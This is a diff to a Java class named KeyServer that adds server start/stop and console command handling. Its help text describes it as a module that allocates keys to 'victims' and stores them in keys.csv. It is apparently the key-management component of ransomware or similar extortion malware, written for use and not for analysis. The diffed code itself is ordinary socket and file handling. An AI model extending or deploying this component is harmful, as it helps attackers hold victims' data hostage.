@@ -18,22 +18,78 @@ import java.security.spec.X509EncodedKeySpec;
 public class KeyServer {
   public static final String ANSI_RESET = "\u001B[0m";
   public static final String ANSI_CYAN = "\u001B[36m";
+  public static final String KS_HEADER = ANSI_CYAN + "[KeyServer]: " + ANSI_RESET;
   private Socket          socket   = null;
+  private int port;
+  private KSListener l;
   private ServerSocket    server   = null;
+  private boolean running;
 
   public KeyServer(int port)
   {
-      try
-      {
-          server = new ServerSocket(port);
-          KSListener l = new KSListener(socket, server);
-          l.start();
+    this.port = port;
+    startServer();
+  }
+  public void startServer() {
+          try
+          {
+                  server = new ServerSocket(port);
+                  l = new KSListener(socket, server);
+                  l.start();
+                  running = true;
+          }
+          catch(IOException i)
+          {
+                  System.out.println(KS_HEADER + "Failed to start the server");
+          }
+  }
 
-      }
-      catch(IOException i)
-      {
-          System.out.println(i.getStackTrace());
-      }
+  public void stopServer() {
+          try
+          {
+            server.close();
+            running = false;
+          }
+          catch(IOException i)
+          {
+                  System.out.println(KS_HEADER + "Failed to stop the server");
+          }
+
+  }
+
+  public void command(String cmd) { // receive command from the main server
+          switch (cmd) {
+          case "help":
+                  System.out.println("KeyServer is a module to allocate keys to victims, and store them in keys.csv.\n");
+                  System.out.println("KeyServer commands:\n");
+                  System.out.println("*tip: all KeyServer commands are ran with the KS header");
+                  System.out.println("\tKS.help: show this page");
+                  System.out.println("\tKS.off: stop KeyServer");
+                  System.out.println("\tKS.on: turn on KeyServer");
+                  System.out.println("\tKS.reset: reset keys.csv");
+                  System.out.println("\tKS.manual: show manual page");
+                  return;
+          case "reset": // show all authenticated requests
+                  try {
+                    File f = new File("keys.csv");
+                    FileWriter writer = new FileWriter(f);
+                    writer.write("");
+                    writer.close();
+                  } catch (Exception e) {
+                    System.out.println("Unable to reset keys.csv: " + e);
+                  }
+                  return;
+          case "off":
+                  stopServer();
+                  return;
+          case "on":
+                  startServer();
+                  return;
+          case "":
+                  return;
+          }
+
+
   }
 
   public static void main(String args[])
@@ -74,7 +130,7 @@ class KSListener extends Thread {
   }
   catch(IOException i)
   {
-      System.out.println(i.getStackTrace());
+      System.out.println(i);
   }
   }
 }
